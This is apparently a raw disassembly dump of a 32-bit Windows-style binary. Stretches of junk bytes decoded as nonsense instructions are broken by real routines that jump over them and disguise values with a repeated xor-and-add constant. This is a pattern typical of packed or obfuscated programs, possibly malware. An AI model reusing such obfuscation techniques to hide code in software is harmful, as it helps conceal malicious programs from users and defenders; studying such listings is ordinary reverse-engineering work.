  404caa:	scas   eax,DWORD PTR es:[edi]
  404cab:	xor    ah,BYTE PTR [eax]
  404cad:	je     0x404c70
  404caf:	adc    eax,0x4e60194
  404cb4:	cmp    BYTE PTR [eax+edi*2-0x52f83f9f],dl
  404cbb:	jb     0x404c82
  404cbd:	jno    0x404c78
  404cbf:	lea    ecx,[eax+0x33ec0104]
  404cc5:	das    
  404cc6:	(bad)  [ecx-0x5b]
  404cc9:	push   cs
  404cca:	nop
  404ccb:	fs and al,0x6d
  404cce:	xchg   ebx,eax
  404ccf:	or     esp,edx
  404cd1:	jns    0x404d01
  404cd3:	out    dx,al
  404cd4:	mov    eax,ds:0xb274e6ea
  404cd9:	mov    WORD PTR [ebp+eax*4-0x3b7f782f],?
  404ce0:	fucomi st,st(2)
  404ce2:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  404ce3:	mov    esi,0xa29fd14c
  404ce8:	ret    
  404ce9:	xor    BYTE PTR [eax-0x46],ch
  404cec:	sub    ah,BYTE PTR [ebp-0xe]
  404cef:	ret    
  404cf0:	jg     0x404c93
  404cf2:	lods   al,BYTE PTR ds:[esi]
  404cf3:	lahf   
  404cf4:	mov    ah,0x9c
  404cf6:	and    esi,DWORD PTR [edx-0x32b1e27]
  404cfc:	pop    esp
  404cfd:	or     eax,0xa81c9d41
  404d02:	push   ds
  404d03:	iret   
  404d04:	hlt    
  404d05:	inc    esp
  404d06:	jno    0x404d22
  404d08:	adc    al,0x6a
  404d0a:	int    0x7f
  404d0c:	push   es
  404d0d:	xor    ebp,DWORD PTR [eax]
  404d0f:	add    esi,DWORD PTR [ebx+0x5c046c01]
  404d15:	leave  
  404d16:	sbb    BYTE PTR [eax],0xe9
  404d19:	sti    
  404d1a:	sahf   
  404d1b:	xchg   ebp,eax
  404d1c:	shl    dh,0xa
  404d1f:	add    eax,0xd4539eae
  404d24:	or     esi,ecx
  404d26:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  404d27:	sbb    DWORD PTR [ebx+0x77],esp
  404d2a:	jmp    0xf18c4ec7
  404d2f:	pop    esp
  404d30:	push   esi
  404d31:	ret    0x9833
  404d34:	imul   esp,DWORD PTR [ebx-0x583915fe],0xef6bebee
  404d3e:	jge    0x404dbb
  404d40:	and    al,0xf0
  404d42:	push   0xffffff82
  404d44:	sar    dh,0x15
  404d47:	inc    ecx
  404d48:	aas    
  404d49:	cmp    eax,0xfe1bbaaf
  404d4e:	test   DWORD PTR [ecx-0x34],0xb36866ed
  404d55:	xor    bl,dl
  404d57:	xchg   ecx,eax
  404d58:	cli    
  404d59:	mov    ds:0x379914d6,eax
  404d5e:	push   0xffffffb6
  404d60:	sub    DWORD PTR [ebp-0x4b007625],eax
  404d66:	test   DWORD PTR [ebx+0x27],ebx
  404d69:	mov    fs,WORD PTR [edx+0x5f]
  404d6c:	xchg   esi,eax
  404d6d:	pop    ds
  404d6e:	inc    edi
  404d6f:	xor    BYTE PTR [esp+ebx*1+0x5c],0x9d
  404d74:	dec    edx
  404d75:	addr16 (bad) 
  404d77:	into   
  404d78:	out    0x38,al
  404d7a:	(bad)  
  404d7b:	jp     0x404d84
  404d7d:	fwait
  404d7e:	mov    al,ah
  404d80:	xor    al,0xd6
  404d82:	or     ch,dh
  404d84:	dec    esp
  404d85:	jge    0x404d1a
  404d87:	aas    
  404d88:	xchg   ecx,eax
  404d89:	into   
  404d8a:	in     al,0xd9
  404d8c:	adc    al,0xf2
  404d8e:	xor    dh,bl
  404d90:	dec    ebx
  404d91:	add    eax,0x281ccf56
  404d96:	in     al,dx
  404d97:	cmp    BYTE PTR [edi+0x6cc02e11],0x9b
  404d9e:	mov    al,0xcd
  404da0:	add    eax,0x3d99e8c4
  404da5:	ficomp WORD PTR [eax-0x322bc869]
  404dab:	outs   dx,DWORD PTR ds:[esi]
  404dac:	sbb    DWORD PTR [ebp*1+0x7dc97ae1],0x56
  404db4:	inc    ebp
  404db5:	jmp    0x404d6b
  404db7:	jb     0x404ddc
  404db9:	mov    bh,dh
  404dbb:	(bad)  [edi+ebx*8-0x768df4f1]
  404dc2:	push   cs
  404dc3:	adc    ch,dh
  404dc5:	or     DWORD PTR [eax],esi
  404dc7:	or     DWORD PTR [edx-0x33],esi
  404dca:	scas   al,BYTE PTR es:[edi]
  404dcb:	ss int3 
  404dcd:	loop   0x404d54
  404dcf:	push   esp
  404dd0:	cmp    bl,BYTE PTR [edx]
  404dd2:	pushf  
  404dd3:	addr16 mov dh,0xf7
  404dd6:	fwait
  404dd7:	lods   al,BYTE PTR ds:[esi]
  404dd8:	add    eax,0x3d0339c
  404ddd:	ror    DWORD PTR [edi],1
  404ddf:	scas   eax,DWORD PTR es:[edi]
  404de0:	xlat   BYTE PTR ds:[ebx]
  404de1:	mov    edi,DWORD PTR [ebp-0xc]
  404de4:	xor    edi,eax
  404de6:	sub    edx,edi
  404de8:	mov    edi,DWORD PTR [ebp-0xc]
  404deb:	mov    ebx,DWORD PTR [ebp-0x14]
  404dee:	jmp    0x404f53
  404df3:	push   ebx
  404df4:	pop    ebx
  404df5:	inc    edx
  404df6:	cmp    DWORD PTR [edx-0x67],0x31957d53
  404dfd:	jb     0x404e2d
  404dff:	or     al,0xb2
  404e01:	leave  
  404e02:	sbb    DWORD PTR [esi+0x347c7c14],ebp
  404e08:	jg     0x404e86
  404e0a:	jl     0x404e5c
  404e0c:	sbb    al,0xec
  404e0e:	hlt    
  404e0f:	enter  0xea84,0x7e
  404e13:	sbb    edi,ebx
  404e15:	or     al,0xbc
  404e17:	scas   eax,DWORD PTR es:[edi]
  404e18:	lahf   
  404e19:	dec    ebp
  404e1a:	cdq    
  404e1b:	push   0xa6a57365
  404e20:	loop   0x404da4
  404e22:	add    al,0xfa
  404e24:	clc    
  404e25:	iret   
  404e26:	jbe    0x404e93
  404e28:	test   al,0x1c
  404e2a:	inc    esi
  404e2b:	jnp    0x404db4
  404e2d:	shl    BYTE PTR [edx+0x46],1
  404e30:	imul   esp,DWORD PTR [esi-0x2a],0x37
  404e34:	out    0xb7,al
  404e36:	shl    BYTE PTR [edx-0x66],cl
  404e39:	jb     0x404e6a
  404e3b:	jle    0x404dbe
  404e3d:	fild   QWORD PTR [edi+0x77]
  404e40:	xor    ebp,ebx
  404e42:	pushf  
  404e43:	jmp    0x404e8c
  404e45:	call   FWORD PTR [eax+0x5e]
  404e48:	in     al,dx
  404e49:	scas   eax,DWORD PTR es:[edi]
  404e4a:	push   ecx
  404e4b:	lds    ebx,FWORD PTR fs:[ebp-0x1c]
  404e4f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  404e50:	call   0xf762:0xa65fc9b9
  404e57:	popf   
  404e58:	fstp   st(7)
  404e5a:	ins    DWORD PTR es:[edi],dx
  404e5b:	mov    ebx,DWORD PTR [edx]
  404e5d:	pop    edi
  404e5e:	pop    ss
  404e5f:	mov    ds:0x5c224efd,eax
  404e64:	sub    BYTE PTR [edx+0x7],cl
  404e67:	in     eax,dx
  404e68:	stos   BYTE PTR es:[edi],al
  404e69:	loop   0x404e3c
  404e6b:	jp     0x404e64
  404e6d:	imul   edi,DWORD PTR ds:0xb18da66e,0xb41f95e6
  404e77:	cmp    bh,BYTE PTR [ecx+0x1ea8c7b9]
  404e7d:	sbb    BYTE PTR [ebx],ah
  404e7f:	pushf  
  404e80:	ret    0xc475
  404e83:	pop    es
  404e84:	test   DWORD PTR [edi+ebx*2+0x6],ebx
  404e88:	iret   
  404e89:	adc    edi,0x66f26a4d
  404e8f:	rcl    eax,1
  404e91:	fstp   st(6)
  404e93:	mov    al,0x42
  404e95:	int    0x86
  404e97:	adc    ebx,DWORD PTR [edx+0x381df865]
  404e9d:	sub    al,0x89
  404e9f:	jnp    0x404eb8
  404ea1:	add    eax,0x73cd4e2b
  404ea6:	sub    eax,0xcfde8916
  404eab:	jbe    0x404f12
  404ead:	mov    ch,0xca
  404eaf:	pop    edi
  404eb0:	adc    esp,DWORD PTR [esp+edx*4]
  404eb3:	or     bl,ah
  404eb5:	xlat   BYTE PTR ds:[ebx]
  404eb6:	ins    BYTE PTR es:[edi],dx
  404eb7:	iret   
  404eb8:	test   DWORD PTR [eax+0x68],ebx
  404ebb:	(bad)  
  404ebc:	sub    al,cl
  404ebe:	xor    ah,BYTE PTR [edi+0x1da2c1b8]
  404ec4:	jmp    0x404ebe
  404ec6:	sub    eax,0x5a99998f
  404ecb:	xchg   edi,eax
  404ecc:	shl    DWORD PTR [ebx+0x75efa231],1
  404ed2:	xchg   esp,eax
  404ed3:	fst    st(1)
  404ed5:	pop    ebx
  404ed6:	or     BYTE PTR [ebx+0xa535be7],bl
  404edc:	ins    DWORD PTR es:[edi],dx
  404edd:	cld    
  404ede:	aaa    
  404edf:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  404ee0:	mov    ah,0x83
  404ee2:	push   esp
  404ee3:	test   ebx,ebp
  404ee5:	leave  
  404ee6:	sbb    dh,0x32
  404ee9:	ret    
  404eea:	retf   0x52c8
  404eed:	div    ebx
  404eef:	add    BYTE PTR [esi-0x73],al
  404ef2:	or     edx,ebp
  404ef4:	mov    esi,0x38f1abb3
  404ef9:	jns    0x404f17
  404efb:	mov    dl,0x87
  404efd:	test   DWORD PTR [edx+eax*1],0xc309e310
  404f04:	outs   dx,DWORD PTR ds:[esi]
  404f05:	in     eax,0x43
  404f07:	xor    BYTE PTR [ecx+eax*1-0x59],dl
  404f0b:	clc    
  404f0c:	fisub  DWORD PTR [esi-0x7d]
  404f0f:	adc    eax,0x24f04611
  404f14:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  404f15:	int3   
  404f16:	lahf   
  404f17:	test   eax,0x1abaedd6
  404f1d:	pop    edi
  404f1e:	push   eax
  404f1f:	xchg   esi,eax
  404f20:	xlat   BYTE PTR ds:[ebx]
  404f21:	pop    ebx
  404f22:	pushf  
  404f23:	sbb    DWORD PTR ds:[edx+0x6ebed9af],ebx
  404f2a:	xor    ebp,edi
  404f2c:	adc    al,0x81
  404f2e:	adc    eax,0x33a014c4
  404f33:	add    al,0x54
  404f35:	ret    
  404f36:	sub    al,0x63
  404f38:	mov    eax,0x3460db13
  404f3d:	pop    es
  404f3e:	cmc    
  404f3f:	rol    DWORD PTR [ebx+0xc9002fc],cl
  404f45:	(bad)
  404f49:	repnz ror BYTE PTR [ebp+0x1a],1
  404f4d:	pusha  
  404f4e:	xchg   ecx,eax
  404f4f:	cmp    bh,bh
  404f51:	fsub   DWORD PTR [ecx]
  404f53:	xor    edi,eax
  404f55:	add    edi,ecx
  404f57:	imul   edi,ebx
  404f5a:	mov    ebx,DWORD PTR [ebp-0x18]
  404f5d:	xor    ebx,eax
  404f5f:	sub    edx,ecx
  404f61:	lea    edi,[edi+ebx*1+0x32729e]
  404f68:	cmp    edi,edx
  404f6a:	jbe    0x4047d5
  404f70:	mov    edx,DWORD PTR [ebp-0xc]
  404f73:	mov    edi,DWORD PTR [ebp-0x24]
  404f76:	xor    edx,eax
  404f78:	add    edx,ecx
  404f7a:	imul   edx,edi
  404f7d:	mov    edi,DWORD PTR [ebp-0x18]
  404f80:	xor    edi,eax
  404f82:	add    edx,edi
  404f84:	mov    edi,DWORD PTR [ebp-0x8]
  404f87:	lea    edx,[edx+edi*1+0x32729e]
  404f8e:	mov    DWORD PTR [ebp-0x8],edx
  404f91:	jmp    0x4050f6
  404f96:	jecxz  0x404f49
  404f98:	out    0xe3,eax
  404f9a:	jge    0x405019
  404f9c:	sti    
  404f9d:	mov    cl,0x66
  404f9f:	pop    edx
  404fa0:	cmp    BYTE PTR ds:0xd9e31444,cl
  404fa6:	popw   ss
  404fa8:	jl     0x405026
  404faa:	xor    al,0x7f
  404fac:	jl     0x40502a
  404fae:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  404faf:	push   esi
  404fb0:	imul   ebx,eax,0xffffffb4
  404fb3:	test   eax,0x3a828fa6
  404fb8:	pop    ebx
  404fb9:	fadd   QWORD PTR [edi+esi*8-0x69]
  404fbd:	ret    
  404fbe:	adc    BYTE PTR [edi],ch
  404fc0:	fidivr DWORD PTR [esi]
  404fc2:	push   0x75cacbeb
  404fc7:	add    DWORD PTR [esi],esp
  404fc9:	aas    
  404fca:	sbb    edx,DWORD PTR [ebx]
  404fcc:	adc    eax,0xc29f778
  404fd1:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  404fd2:	push   0x9
  404fd4:	push   ebp
  404fd5:	mov    ds:0xb99d3c08,eax
  404fda:	jb     0x405013
  404fdc:	and    eax,0x211959ab
  404fe1:	mov    ebp,0x73be6b85
  404fe6:	es ins DWORD PTR es:[edi],dx
  404fe8:	in     al,dx
  404fe9:	fist   WORD PTR [edi]
  404feb:	xor    DWORD PTR [edi+0x31],esp
  404fee:	sub    ah,ah
  404ff0:	xchg   ebx,eax
  404ff1:	xchg   esi,eax
  404ff2:	stos   DWORD PTR es:[edi],eax
  404ff3:	adc    al,0x89
  404ff5:	adc    BYTE PTR [ecx],ah
  404ff7:	int    0x77
  404ff9:	mov    ecx,0x757a4a2
  404ffe:	lahf   
  404fff:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  405000:	ins    DWORD PTR es:[edi],dx
  405001:	in     eax,0x2
  405003:	sub    al,0x3d
  405005:	inc    ecx
  405006:	push   esi
  405007:	aam    0x97
  405009:	sub    al,0xff
  40500b:	xchg   edx,eax
  40500c:	mov    dl,0xbf
  40500e:	imul   ebx
  405010:	cmp    ebx,eax
  405012:	mov    al,0xaf
  405014:	jp     0x404f9a
  405016:	sub    edi,DWORD PTR [ebp+0x1fd50ae2]
  40501c:	adc    esp,DWORD PTR [ecx]
  40501e:	or     al,0x4
  405020:	cs repnz xchg esi,eax
  405023:	sbb    ch,BYTE PTR [eax]
  405025:	add    al,0x70
  405027:	or     bh,BYTE PTR [esi]
  405029:	sar    bl,1
  40502b:	ss sbb esi,ebx
  40502e:	das    
  40502f:	dec    eax
  405030:	outs   dx,BYTE PTR ds:[esi]
  405031:	add    DWORD PTR [edi+0x41],ebx
  405034:	xchg   DWORD PTR [esi+0x72],ebp
  405037:	lods   eax,DWORD PTR fs:[esi]
  405039:	add    BYTE PTR [eax+0x32f93140],al
  40503f:	rcl    BYTE PTR [ebp-0x68],cl
  405042:	inc    ebp
  405043:	jge    0x404fd5
  405045:	pushf  
  405046:	xor    ebx,ecx
  405048:	div    DWORD PTR [eax]
  40504a:	fiadd  WORD PTR [ecx+0x6547a0ee]
  405050:	loope  0x40508f
  405052:	inc    eax
  405053:	pop    edi
  405054:	push   edx
  405055:	push   esp
  405056:	shl    DWORD PTR [esi],0x30
  405059:	fnsave ds:0x9afa48a
  40505f:	cmp    dh,BYTE PTR [ebx+0x2e]
  405062:	pop    es
  405063:	jl     0x4050db
  405065:	scas   eax,DWORD PTR es:[edi]
  405066:	jo     0x4050d8
  405068:	nop
  405069:	pusha  
  40506a:	loope  0x40504e
  40506c:	pop    ecx
  40506d:	ja     0x4050eb
  40506f:	and    BYTE PTR [esi],0x69
  405072:	fwait
  405073:	cdq    
  405074:	add    eax,0x595bcfb3
  405079:	(bad)  
  40507a:	jp     0x40508c
  40507c:	mov    al,ds:0xda8973fc
  405081:	push   ss
  405082:	jne    0x4050b8
  405084:	cmp    eax,0x18685ea7
  405089:	shl    DWORD PTR [edi],0xc2
  40508c:	int    0xa8
  40508e:	mov    WORD PTR es:[esi-0x77],fs
  405092:	inc    esp
  405093:	xor    edi,DWORD PTR [edi-0x436041ad]
  405099:	push   ebp
  40509a:	push   ecx
  40509b:	mov    ecx,0xbe8baa3f
  4050a0:	lahf   
  4050a1:	mov    dh,0x2d
  4050a3:	imul   DWORD PTR [edi+0x3f236bfa]
  4050a9:	jne    0x4050fb
  4050ab:	(bad)  
  4050ac:	add    DWORD PTR [edx-0x6b5a059c],esi
  4050b2:	cmc    
  4050b3:	addr16 gs (bad) 
  4050b6:	repz clc 
  4050b8:	push   edi
  4050b9:	popa   
  4050ba:	inc    ecx
  4050bb:	scas   al,BYTE PTR es:[edi]
  4050bc:	popf   
  4050bd:	adc    dh,dh
  4050bf:	jns    0x405064
  4050c1:	shl    BYTE PTR [edi+0x36],0xf3
  4050c5:	mov    dh,ah
  4050c7:	jge    0x405052
  4050c9:	scas   al,BYTE PTR es:[edi]
  4050ca:	(bad)  
  4050cb:	ficom  DWORD PTR [esi*2+0x7336d195]
  4050d2:	sub    eax,0x6189d800
  4050d7:	in     eax,dx
  4050d8:	or     al,0xea
  4050da:	pop    es
  4050db:	xchg   esi,ecx
  4050dd:	xor    edx,esp
  4050df:	popa   
  4050e0:	in     eax,0x83
  4050e2:	(bad)  
  4050e3:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4050e4:	push   esp
  4050e5:	xlat   BYTE PTR ds:[ebx]
  4050e6:	or     BYTE PTR [ecx],bl
  4050e8:	ss in  al,dx
  4050ea:	and    ebx,ebp
  4050ec:	jecxz  0x40512e
  4050ee:	add    al,0x9f
  4050f0:	mov    esp,0x55c9c82f
  4050f5:	fimul  WORD PTR [ebx-0x2fcc1fab]
  4050fb:	mov    edi,0xffcd8d62
  405100:	sub    edi,edx
  405102:	add    edi,DWORD PTR [ebp-0x10]
  405105:	mov    edx,DWORD PTR [ebp-0x20]
  405108:	mov    ebx,DWORD PTR [ebp-0x8]
  40510b:	xor    edx,eax
  40510d:	add    edx,ecx
  40510f:	imul   edx,ebx
  405112:	cmp    edx,edi
  405114:	jbe    0x4038c9
  40511a:	pop    ebx
  40511b:	pop    edi
  40511c:	leave  
  40511d:	ret    0x8
  405120:	push   ebp
  405121:	mov    ebp,esp
  405123:	push   ecx
  405124:	adc    DWORD PTR ds:0x41074f,ebx
  40512a:	mov    DWORD PTR [ebp-0x4],0xf89c8531
  405131:	and    DWORD PTR ds:0x4489a0,0x0
  40513b:	jmp    0x40514d
  405140:	mov    edx,DWORD PTR ds:0x4489a0
  405146:	inc    edx
  405147:	mov    DWORD PTR ds:0x4489a0,edx
  40514d:	cmp    DWORD PTR ds:0x4489a0,0x10
  405154:	jae    0x40518d
  40515a:	cmp    DWORD PTR ds:0x4489a0,0x18
  405161:	jne    0x40517b
  405167:	push   DWORD PTR [ebp-0x10]
  40516a:	push   DWORD PTR [ebp-0x14]
  40516d:	push   0x410939
  405172:	push   DWORD PTR [ebp-0x10]
  405175:	call   DWORD PTR ds:0x443010
  40517b:	jmp    0x405140
  405180:	movzx  edx,BYTE PTR ds:0x44b6e4
  405187:	adc    DWORD PTR ds:0x4248c2,edx
  40518d:	mov    eax,DWORD PTR [ebp-0x4]
  405190:	adc    edx,ecx
  405192:	jmp    0x4052a5
  405197:	shr    DWORD PTR [ebp+0x4e7dfe7d],cl
  40519d:	sti    
  40519e:	ins    DWORD PTR es:[edi],dx
  40519f:	fs jne 0x40519a
  4051a2:	push   edi
  4051a3:	clc    
  4051a4:	sub    eax,0x293e0232
  4051a9:	jl     0x405227
  4051ab:	bound  edi,QWORD PTR [esp+edi*2+0x7c]
  4051af:	idiv   cl
  4051b1:	sbb    al,0x86
  4051b3:	push   cs
  4051b4:	pop    esi
  4051b6:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4051b7:	(bad)  
  4051b9:	cld    
  4051ba:	pusha  
  4051bb:	and    al,0x4a
  4051bd:	sahf   
  4051be:	add    ebx,ebp
  4051c0:	mov    WORD PTR [edx+0x76bdef38],cs
  4051c6:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4051c7:	adc    esi,DWORD PTR [ebx+0x33]
  4051ca:	cwde   
  4051cb:	push   ds
  4051cc:	nop
  4051cd:	in     al,0x33
  4051cf:	outs   dx,DWORD PTR ds:[esi]
  4051d0:	push   0x13
  4051d2:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4051d3:	push   ds
  4051d4:	cmp    al,0x68
  4051d6:	and    DWORD PTR [edi],0x9757ecee
  4051dc:	jmp    0x405188
  4051de:	mov    bl,0xa7
  4051e0:	repnz fcom DWORD PTR [edi]
  4051e3:	scas   al,BYTE PTR es:[edi]
  4051e4:	ja     0x40516e
  4051e6:	cmp    ch,0x57
  4051e9:	push   ecx
  4051ea:	ins    DWORD PTR es:[edi],dx
  4051eb:	in     eax,dx
  4051ec:	add    BYTE PTR [ebx-0x5d],bl
  4051ef:	xor    DWORD PTR [ebx+0xf798610],esi
  4051f5:	in     al,0x3e
  4051f7:	jge    0x405259
  4051f9:	hlt    
  4051fa:	and    BYTE PTR [ebp+0x6d2af10f],dl
  405200:	mov    ebp,DWORD PTR [ecx-0x3f]
  405203:	cmp    edi,DWORD PTR [edx-0x56]
  405206:	fcmovbe st,st(0)
  405208:	inc    edx
  405209:	xchg   edi,eax
  40520a:	jmp    0x9b4370ae
  40520f:	lods   eax,DWORD PTR ds:[esi]
  405210:	jge    0x405261
  405212:	or     DWORD PTR [edi-0x697f3afd],esp
  405218:	inc    eax
  405219:	push   ecx
  40521a:	or     al,BYTE PTR [eax]
  40521c:	or     ecx,DWORD PTR [ebx+0x2a2e2a6e]
  405222:	xlat   BYTE PTR ds:[ebx]
  405223:	add    edx,DWORD PTR [edx+0x65]
  405226:	in     al,0xab
  405228:	xor    al,0xe8
  40522a:	sbb    esp,DWORD PTR [edx+0x44]
  40522d:	test   DWORD PTR [edi+0x72],ecx
  405230:	sub    edi,DWORD PTR [edi]
  405232:	add    dh,BYTE PTR [ecx+0x68]
  405235:	pop    ebp
  405236:	sti    
  405237:	pop    ecx
  405238:	cmc    
  405239:	(bad)  
  40523a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40523b:	ret    
  40523c:	es dec edx
  40523e:	repz inc edi
  405240:	jmp    0xfd47fe45
  405245:	mov    BYTE PTR [eax+0x7a5edbc2],al
  40524b:	adc    DWORD PTR ds:0xc8c8e78b,0x65
  405252:	(bad)  
  405253:	icebp  
  405254:	call   0x133c:0xb58f81a4
  40525b:	sub    al,0x29
  40525d:	jo     0x4051e5
  40525f:	jp     0x4051e9
  405261:	pop    ds
  405262:	mov    eax,DWORD PTR [ebx]
  405264:	mov    eax,ds:0x27a063bb
  405269:	aas    
  40526a:	xchg   edx,eax
  40526b:	or     ah,ch
  40526d:	repz inc esp
  40526f:	int    0xb9
  405271:	adc    eax,0x944cf57b
  405276:	jo     0x405286
  405278:	push   cs
  405279:	fild   WORD PTR [edi-0x6f51dae8]
  40527f:	mov    cl,0x7
  405281:	push   edx
  405282:	(bad)  
  405284:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  405285:	sti    
  405286:	ins    DWORD PTR es:[edi],dx
  405287:	popf   
  405288:	dec    ebp
  405289:	nop
  40528a:	xor    cl,dh
  40528c:	stc    
  40528d:	imul   ecx,DWORD PTR [ebx],0x33
  405290:	add    eax,0x5af2f48f
  405295:	movhps QWORD PTR [ecx+0x1650126f],xmm3
  40529c:	xchg   BYTE PTR [esi],dh
  40529e:	sub    BYTE PTR [ecx-0x5a],0x5a
  4052a2:	cmp    BYTE PTR [eax+0x4e],bl
  4052a5:	mov    edx,DWORD PTR [ebp+0x10]
  4052a8:	jmp    0x4053bb
  4052ad:	shl    ecx,0xe4
  4052b0:	xchg   edi,eax
  4052b1:	fs jns 0x4052f5
  4052b4:	jns    0x4052eb
  4052b6:	adc    al,0x56
  4052b8:	jne    0x40532e
  4052ba:	stos   BYTE PTR es:[edi],al
  4052bb:	and    al,0x35
  4052bd:	and    al,0x28
  4052bf:	jl     0x40533d
  4052c1:	bound  edi,QWORD PTR [esp+edi*2+0x7c]
  4052c5:	jns    0x405339
  4052c7:	cli    
  4052c8:	cvtss2sd xmm3,xmm3
  4052cc:	frstor [eax+0x1a8f932a]
  4052d2:	adc    al,0xc7
  4052d4:	and    al,0x90
  4052d6:	or     al,0x7b
  4052d8:	repnz and eax,0x4227ab03
  4052de:	xor    eax,0xcdf140ae
  4052e3:	test   BYTE PTR [ecx],bh
  4052e5:	mov    eax,DWORD PTR ds:0xe8c3d4ab
  4052eb:	sub    esp,DWORD PTR [ebp-0x9]
  4052ee:	retf   0xedb5
  4052f1:	rcr    DWORD PTR ds:0xfbe71ee0,0x95
  4052f8:	loopne 0x40535d
  4052fa:	or     BYTE PTR [edx-0x10ba3856],cl
  405300:	es gs out 0xf2,al
  405304:	dec    esi
  405305:	xchg   edi,eax
  405306:	jg     0x871f4e59
  40530c:	rcl    BYTE PTR [ecx-0x75e7a6a6],cl
  405312:	and    dh,BYTE PTR [ecx]
  405314:	retf   0xe855
  405317:	lock je 0x405395
  40531a:	leave  
  40531b:	inc    ebx
  40531c:	data16 and BYTE PTR [eax],dh
  40531f:	loope  0x405329
  405321:	retf   0x8068
  405324:	pop    edi
  405325:	push   0x95af5a88
  40532a:	scas   al,BYTE PTR es:[edi]
  40532b:	mov    ebp,0x7b4bd35d
  405330:	jne    0x4052e8
  405332:	je     0x4052c4
  405334:	inc    ebp
  405335:	or     edx,ecx
  405337:	js     0x40536e
  405339:	mov    eax,0x5df0e94b
  40533e:	push   edi
  40533f:	pop    ecx
  405340:	daa    
  405341:	das    
  405342:	push   ds
  405343:	jbe    0x4052f0
  405345:	call   0xb504ba40
  40534a:	repnz xchg ecx,eax
  40534c:	cmovno esi,DWORD PTR [ecx-0x5d0ec28c]
  405353:	std    
  405354:	out    dx,eax
  405355:	inc    edi
  405356:	jg     0x405390
  405358:	shr    BYTE PTR [eax],cl
  40535a:	or     ecx,DWORD PTR [ebp-0x2a]
  40535d:	jge    0x4053c2
  40535f:	cs sbb edx,ebx
  405362:	jecxz  0x405360
  405364:	in     al,dx
  405365:	pop    edx
  405366:	inc    esi
  405367:	sahf   
  405368:	dec    esi
  40536a:	mov    ecx,0x6818847f
  40536f:	js     0x40533e
  405371:	xor    edx,DWORD PTR [eax+0x5a]
  405374:	out    0x42,eax
  405376:	in     eax,dx
  405377:	lock mov ds,eax
  40537a:	lock jl 0x4053e6
  40537d:	pop    eax
  40537e:	rol    ebp,0xe7
  405381:	mov    bl,0xf9
  405383:	shl    BYTE PTR [eax+eiz*8],1
  405386:	add    eax,0x44285253
  40538b:	test   edx,0x75152a67
  405391:	or     edx,DWORD PTR [ebx]
  405393:	cmp    edi,esp
  405395:	pushf  
  405396:	sahf   
  405397:	ds mov ecx,0xc12d474c
  40539d:	icebp  
  40539e:	jl     0x405335
  4053a0:	cmp    al,al
  4053a2:	pop    ebx
  4053a3:	test   dl,0x3f
  4053a6:	in     eax,0xae
  4053a8:	call   0xcc54:0x1bbcff4c
  4053af:	pusha  
  4053b0:	xchg   esp,eax
  4053b1:	ins    DWORD PTR es:[edi],dx
  4053b2:	(bad)  
  4053b3:	fidiv  WORD PTR [esp+esi*8]
  4053b6:	sub    esi,esi
  4053b8:	outs   dx,BYTE PTR ds:[esi]
  4053b9:	cmp    DWORD PTR [ebx+0x510857b9],edi
  4053bf:	pop    es
  4053c0:	xor    DWORD PTR ds:0x4248ca,0x5c99
  4053ca:	xor    eax,ecx
  4053cc:	add    eax,0x32729e
  4053d1:	sub    DWORD PTR ds:0x4248d6,0x41074b
  4053db:	mov    DWORD PTR [edx],eax
  4053dd:	mov    eax,DWORD PTR [ebp+0xc]
  4053e0:	xor    eax,ecx
  4053e2:	push   esi
  4053e3:	add    DWORD PTR ds:0x44b6e4,0x2efc
  4053ed:	mov    esi,DWORD PTR [ebp+0x10]
  4053f0:	mov    edx,0x32729e
  4053f5:	sub    DWORD PTR ds:0x44e428,0x7c97
  4053ff:	add    eax,edx
  405401:	xor    DWORD PTR ds:0x44e428,0x44b6dc
  40540b:	mov    DWORD PTR [esi+0x4],eax
  40540e:	mov    DWORD PTR ds:0x44e424,0x1d
  405418:	cmp    DWORD PTR ds:0x44e424,0x0
  40541f:	je     0x405452
  405425:	cmp    DWORD PTR ds:0x44e424,0x21
  40542c:	jne    0x405442
  405432:	push   0x4107d0
  405437:	push   0x400000
  40543c:	call   DWORD PTR ds:0x4430dc
  405442:	mov    eax,ds:0x44e424
  405447:	dec    eax
  405448:	mov    ds:0x44e424,eax
  40544d:	jmp    0x405418
  405452:	mov    eax,DWORD PTR [ebp+0x14]
  405455:	mov    esi,DWORD PTR [ebp+0x10]
  405458:	mov    DWORD PTR [esi+0x8],eax
  40545b:	mov    eax,DWORD PTR [ebp+0x18]
  40545e:	mov    esi,DWORD PTR [ebp+0x10]
  405461:	mov    DWORD PTR [esi+0xc],eax
  405464:	mov    eax,DWORD PTR [ebp+0x1c]
  405467:	mov    esi,DWORD PTR [ebp+0x10]
  40546a:	mov    DWORD PTR [esi+0x10],eax
  40546d:	mov    eax,eax
  40546f:	mov    eax,DWORD PTR [ebp+0x8]
  405472:	xor    eax,ecx
  405474:	add    eax,edx
  405476:	pop    esi
  405477:	leave  
  405478:	ret    0x18
  40547b:	push   ebp
  40547c:	mov    ebp,esp
  40547e:	mov    eax,DWORD PTR [ebp+0xc]
  405481:	xor    edx,edx
  405483:	mov    ecx,0x7264fcad
  405488:	jmp    0x40559b
  40548d:	enter  0x8006,0xb
  405491:	inc    edx
  405492:	lea    ebx,[ebx-0x27]
  405495:	mov    dl,0x23
  405497:	sub    dh,BYTE PTR [eax]
  405499:	iret   
  40549a:	es xor al,0x98
  40549d:	sub    ch,BYTE PTR [ebx]
  40549f:	jl     0x40551d
  4054a1:	bound  edi,QWORD PTR [esp+edi*2+0x7c]
  4054a5:	ja     0x4054c7
  4054a7:	icebp  
  4054a8:	stos   BYTE PTR es:[edi],al
  4054a9:	mov    al,ds:0x2f202fc3
  4054ae:	inc    ecx
  4054af:	test   BYTE PTR [esi+0x78],dl
  4054b2:	push   0x6e
  4054b4:	gs (bad) 
  4054b6:	in     eax,0x6e
